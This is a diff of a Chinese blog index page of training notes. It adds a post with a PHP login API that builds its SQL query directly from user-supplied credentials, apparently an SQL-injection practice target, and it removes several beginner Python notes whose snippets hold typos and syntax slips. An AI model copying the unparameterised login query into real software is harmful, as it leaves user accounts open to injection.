class="line">        $password = $input[&#x27;password&#x27;];</span><br><span class="line">        $sql = &quot;SELECT username, password FROM users WHERE username=&#x27;$username&#x27; and  password=&#x27;$password&#x27;LIMIT 0,1&quot;;</span><br><span class="line">        $result = mysqli_query($link, $sql);</span><br><span class="line">        if (mysqli_num_rows($result) &gt; 0) &#123;</span><br><span class="line">            echo &#x27;success&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;账号和密码错误&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&#x27;http/1.1 400 Bad Request&#x27;);</span><br><span class="line">    echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们对这段代码进行分析：<br>（1）首先通过设置HTTP头部信息，允许跨域请求，这在前后端分离的项目中是非常常见的。<br>（2）使用mysqli_connect函数连接到MySQL数据库服务器，并选择名为”security”的数据库。如果连接失败，则会返回一个包含错误信息的JSON响应并退出程序。<br>（3）根据接收到的HTTP请求的路径和方法，判断是否为预期的接口路径和请求类型。如果是预期的POST请求，就从请求中获取JSON格式的数据，并解析为关联数组。<br>（4）如果解析JSON数据出错，返回400 Bad Request响应；否则，从接收到的数据中获取用户名和密码，并构造一个SQL查询语句，查询名为”users”的表中是否存在对应的用户名和密码记录。<br>（5）如果查询结果存在匹配的用户名和密码，则返回”success”字符串，表示登录成功；否则，返回”账号和密码错误”字符串，表示登录失败。在未收到预期的路径和请求方法时，同样返回400 Bad Request响应。<br>2.把index.php和api.php复制到虚拟机win10hei的phpstudy的根目录下，打开网站，点击登录，可以跳转到主页页面。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340415039-2ff8e0a3-feb0-42c9-9f62-564858825c25.png" alt="图片2.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340431465-a425e375-7478-4140-9748-ce946165134a.png" alt="图片1.png"></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-培训笔记18" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -752,241 +944,9 @@
 
 
   
-    <article id="post-培训笔记13" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B013/" class="article-date">
-      <time datetime="2023-12-10T01:47:45.000Z" itemprop="datePublished">2023-12-10</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B013/">字符集和编码</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="一-字符集"><a href="#一-字符集" class="headerlink" title="一.字符集"></a>一.字符集</h2><p>1.ascii &#x3D;&gt;编排了128个文字符号，只需要7个0和1就可以表示了。01111111 &#x3D;&gt;1 byte &#x3D;&gt;8bit<br>ANSI&#x3D;&gt; 一套标准，每个字符 16bit,2byte。<br>到了中国，gb2312编码，gbk编码（windows默认）<br>到了台湾，big5编码<br>到了日本，JIS编码</p>
-<p>2.Unicode:万国码<br>3.utf:是可变长度的unicode,可以进行数据的传输和存储<br>  utf-8:最短字节长度8  utf-16：最短字节长度16<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702116211795-d8d7e2d8-93b8-4b95-a48f-221d5f347e6d.png" alt="图片.png"></p>
-<h2 id="二-编码"><a href="#二-编码" class="headerlink" title="二.编码"></a>二.编码</h2><p>1.bytes<br>程序员平时遇到的所有的数据最终单位来自都是字节byte。encode（）编码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=&quot;林俊杰&quot;</span><br><span class="line">bs1=s.encode(&quot;gbk&quot;)            # b&#x27;xxxx&#x27;bytes类型</span><br><span class="line">bs2=s.encode（&quot;utf-8&quot;）</span><br><span class="line">print(bs1)</span><br><span class="line">print（bs2）</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702117144548-56188740-c0ba-49a1-b382-a4f0085fce0c.png" alt="图片.png"></p>
-<h2 id="三-解码"><a href="#三-解码" class="headerlink" title="三.解码"></a>三.解码</h2><p>2.decode（）解码<br>2.1把一个gbk的字节转化成utf-8的字节的步骤<br>先变成字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bs=b&#x27;\xc1\xd6\xbf\xa1\xbd\xdc&#x27;</span><br><span class="line">s=bs.decode(&quot;gbk&quot;)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702118001342-a97f83c0-e27c-4c9c-9633-47d3fd6498e5.png" alt="图片.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-培训笔记12" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B012/" class="article-date">
-      <time datetime="2023-12-10T01:42:41.000Z" itemprop="datePublished">2023-12-10</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B012/">字典</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="一-字典的概念"><a href="#一-字典的概念" class="headerlink" title="一.字典的概念"></a>一.字典的概念</h2><p>1.字典以键值对的形式进行存储数据的<br>2.字典的表示方法：{key:value,key2:value,key3:value}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dic=&#123;&quot;jay&quot;:&quot;周杰伦&quot;,&quot;金毛狮王&quot;:&quot;谢逊&quot;&#125;</span><br><span class="line">val=dic[&quot;jay&quot;]</span><br><span class="line">print（val）</span><br></pre></td></tr></table></figure>
-
-<p>3.字典的key必须是可哈希的数据类型<br>  字典的value 可以是任何的数据类型</p>
-<h2 id="二-字典的增删改查"><a href="#二-字典的增删改查" class="headerlink" title="二.字典的增删改查"></a>二.字典的增删改查</h2><p>1.字典元素的新增和修改<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702048317869-a44f18cd-a0ba-4d91-afd1-a645c47511a9.png" alt="图片.png"><br>2.字典元素的删除</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dic pop(&quot;jay&quot;)         /根据key去删除</span><br><span class="line">print(dic)</span><br></pre></td></tr></table></figure>
-
-<p>3.字典元素的查询</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(dic[&#x27;jay&#x27;])       /如果key不存在会报错</span><br><span class="line">print(dic.get(&#x27;key&#x27;))   /如果key不存在，程序返回None</span><br></pre></td></tr></table></figure>
-
-<p>4.a&#x3D;None     #单纯就是空，表示没有的意思</p>
-<h2 id="三-字典的循环和嵌套"><a href="#三-字典的循环和嵌套" class="headerlink" title="三.字典的循环和嵌套"></a>三.字典的循环和嵌套</h2><h3 id="3-1字典的循环"><a href="#3-1字典的循环" class="headerlink" title="3.1字典的循环"></a>3.1字典的循环</h3><p>1.可以用for循环，直接拿到key</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dic=</span><br><span class="line">&#123;</span><br><span class="line">&quot;张三&quot;:&quot;高&quot;</span><br><span class="line">&quot;李四&quot;:&quot;矮&quot;</span><br><span class="line">&quot;王五&quot;：&quot;胖&quot;</span><br><span class="line">&quot;赵六&quot;：&quot;瘦&quot;</span><br><span class="line">&#125;</span><br><span class="line">for key in dic:</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702104540106-c54c9ec6-8a68-4b49-91b0-48c62aae23a4.png" alt="图片.png"></p>
-<p>2.希望把所有的Key放在同一个列表中<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702105152672-3099f87c-871e-44a0-8455-bce2acb04ada.png" alt="图片.png"><br>3.希望把所有的value放在同一个列表中<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702105419655-7dcd42c2-2a95-4ed0-ab91-5ce9f0447def.png" alt="图片.png"><br>4.直接拿到字典中的key和vlaue</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">print（dic.items（））</span><br><span class="line"></span><br><span class="line">fro key,values in dic.items():    //可以直接拿到字典所有的key和values</span><br><span class="line">print(key,vlaue)</span><br><span class="line"></span><br><span class="line">a,b=(1,2)                //元祖和列表都可以进行这个操作，该操作被称为解包</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>
-
-<h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702106688071-738e0734-0f72-426d-a887-c42ebc33067a.png" alt="图片.png"></h3><h3 id="3-2字典的嵌套"><a href="#3-2字典的嵌套" class="headerlink" title="3.2字典的嵌套"></a>3.2字典的嵌套</h3><p>1.输入以下代码<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702107533010-cdbbd8f7-f576-4e6f-be5a-5140a8e681f7.png" alt="图片.png"></p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702107512864-a2397377-4696-414f-a85f-82684e4c57da.png" alt="图片.png"></p>
-<h2 id="四-字典的循环删除"><a href="#四-字典的循环删除" class="headerlink" title="四.字典的循环删除"></a>四.字典的循环删除</h2><p>1.准备一个临时列表temp，存放即将要删除的key<br>删除姓王的名字</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dic= &#123;</span><br><span class="line">&quot;张三&quot;: &quot;高&quot;,</span><br><span class="line">&quot;李四&quot;: &quot;矮&quot;,</span><br><span class="line">&quot;王五&quot;: &quot;胖&quot;,</span><br><span class="line">&quot;王六&quot;: &quot;瘦&quot;,</span><br><span class="line">&#125;</span><br><span class="line">temp=[]</span><br><span class="line">for key in dic:</span><br><span class="line">    if key.startswith(&quot;王&quot;):</span><br><span class="line">        temp.append(key)</span><br><span class="line">for t in temp:</span><br><span class="line">    dic.pop(t)</span><br><span class="line">    </span><br><span class="line">print(dic)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702108729624-665cacff-b8e8-4301-b664-5844d8980f97.png" alt="图片.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-培训笔记11" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B011/" class="article-date">
-      <time datetime="2023-12-10T01:38:52.000Z" itemprop="datePublished">2023-12-10</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/10/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B011/">列表，元组，set集合</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h2 id="一-列表"><a href="#一-列表" class="headerlink" title="一.列表"></a>一.列表</h2><p>1.定义：能装东西的东西<br>2.在python中用[]表示列一个列表列表中的元素通过，隔开</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=[&quot;张三丰&quot;,&quot;张无忌&quot;,&quot;张绍刚&quot;,[1,2,3,True]]</span><br></pre></td></tr></table></figure>
-
-<p>3.特性：<br>（1）也像想字符串一样也有索引和切片</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lst=[&quot;马化腾&quot;,&quot;马云&quot;,&quot;雷军&quot;,&quot;任正非&quot;]</span><br><span class="line">print（lst[0]）</span><br><span class="line">print(lst[0:3])</span><br><span class="line">print(lst[::-1])</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702025581090-44508f8b-fb19-4600-917f-0af631351ba5.png" alt="图片.png"><br>（2）索引超过范围会报错<br>（3）可以用for循环进行遍历<br>（4）可以用len拿到列表的长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lst=[&quot;马化腾&quot;,&quot;马云&quot;,&quot;雷军&quot;,&quot;任正非&quot;]</span><br><span class="line">for item in lst:</span><br><span class="line">print（item）</span><br><span class="line">print(len(lst))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702026304717-cbd7ef70-8816-41f8-805d-76f743d69a4f.png" alt="图片.png"></p>
-<h2 id="二-列表的增删改查（重点）"><a href="#二-列表的增删改查（重点）" class="headerlink" title="二.列表的增删改查（重点）"></a>二.列表的增删改查（重点）</h2><p>1.向列表中添加内容  ** append（<strong>）和</strong>insert（）<strong>以及</strong>extend（）**</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lst=[]</span><br><span class="line">lst.append(&quot;华为&quot;)                       </span><br><span class="line">lst.append(&quot;小米&quot;)</span><br><span class="line">lst.append(&quot;苹果&quot;)</span><br><span class="line">lst.insert(0,&quot;vivo&quot;)                      //insert可以选择插入的位置</span><br><span class="line">lst.extend(&#x27;华为&#x27;,&#x27;小米&#x27;,&#x27;苹果&#x27;)           //extend可以批量的加</span><br><span class="line">print(lst)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702027505032-6ed7635c-d403-4ba6-8edd-0e423afdf42a.png" alt="图片.png"><br>2.删除列表中的内容**   pop（）  remve()**</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret=lst.pop(3)</span><br><span class="line">print(lst)</span><br><span class="line">print(ret)</span><br><span class="line">lst.remove(&quot;小米&quot;)</span><br><span class="line">print(lst)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702033913762-ae86bd90-3e7f-4d3b-9aa7-d64ca8a83606.png" alt="图片.png"><br>3.修改内容。   直接用索引级就可以进行修改操作</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst[4]=&quot;三星&quot;</span><br><span class="line">print（lst）</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702034352927-766b531f-2f44-4bd6-bf94-39ab9550fb9e.png" alt="图片.png"><br>4.查询。直接用索引级就可以进行查询操作<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702034838083-ea2ecaa3-3266-4686-b302-0021c77b5fd8.png" alt="图片.png"><br>5.补充</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lst.sort()             //对列表进行升序排序</span><br><span class="line">lst=[&quot;牛&quot;，&quot;羊&quot;，&quot;鸡&quot;，[&quot;狗&quot;，&quot;鹅&quot;，[&quot;鸭&quot;，&quot;马&quot;]]，&quot;猫&quot;]</span><br><span class="line">print(lst[3][2][1])     //列表的嵌套</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="三-元组"><a href="#三-元组" class="headerlink" title="三.元组"></a>三.元组</h2><p>1.tuple 元组，特点：不可变的列表。固定了某些数据，不允许外界修改。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t=(&quot;张无忌&quot;,&quot;赵敏&quot;,&quot;呵呵哒&quot;)</span><br><span class="line">t[0]=&quot;樵夫&quot;          ---报错</span><br></pre></td></tr></table></figure>
-
-<p>2.<strong>（1）元祖如果只有一个元素（*），需要在元素的末尾添加一个逗号</strong><br>**   （2）元祖的内存地址不能变**</p>
-<h2 id="四-set集合"><a href="#四-set集合" class="headerlink" title="四.set集合"></a>四.set集合</h2><p>1.s&#x3D;{1,2,4,3}<br>  set集合是无序的<br>2.输入以下代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=&#123;1,2,3,&quot;呵呵&quot;,[]&#125;</span><br><span class="line">print(s)             ------报错unhashable type:&#x27;set&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>不可哈希：python中set集合进行数据存储时，要对数据进行哈希计算。根据计算出来的哈希值存储数据<br>可变的数据类型：list,dict,set<br>可哈希：不可变的数据类型：int,str,tuple,bool<br>3.输入以下代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">set集合元素的增加</span><br><span class="line">s=set()</span><br><span class="line">s.add(&quot;张三&quot;)</span><br><span class="line">s.add(&quot;李四&quot;)</span><br><span class="line">s.add(&quot;王五&quot;)</span><br><span class="line"></span><br><span class="line">set集合元素的删除</span><br><span class="line">s.remove(&quot;张三&quot;)</span><br><span class="line"></span><br><span class="line">set集合元素的修改</span><br><span class="line">s.remove(&quot;张三&quot;)</span><br><span class="line">s.add(&quot;小六&quot;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702044832079-01152cb9-eff2-4aea-806e-52359a4edc9f.png" alt="图片.png"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 </div>
@@ -1058,7 +1018,7 @@
             
             
             
-            
+             tags: ".article-tag a", 
             
             
              archives: ".archive-article-title", 
